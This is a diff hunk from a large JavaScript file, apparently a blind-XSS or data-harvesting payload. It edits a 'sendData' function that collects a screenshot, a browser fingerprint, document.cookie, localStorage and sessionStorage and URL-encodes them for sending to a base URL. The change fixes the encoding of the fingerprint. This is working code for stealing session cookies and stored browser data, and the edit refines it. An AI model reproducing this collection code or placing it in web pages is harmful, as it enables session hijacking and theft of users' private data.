@@ -8506,7 +8506,7 @@ async function sendData(baseURL, otherData) {
     var fingerprintReturn = await Fingerprint2.getPromise()
 
     screenshot = encodeURIComponent(screenshotReturn.toDataURL())
-    fingerprint = JSON.stringify(fingerprintReturn)
+    fingerprint = encodeURIComponent(JSON.stringify(fingerprintReturn))
     cookies = encodeURIComponent(document.cookie)
     localStorageEncoded = encodeURIComponent(JSON.stringify(localStorage))
     sessionStorageEncoded = encodeURIComponent(JSON.stringify(sessionStorage))
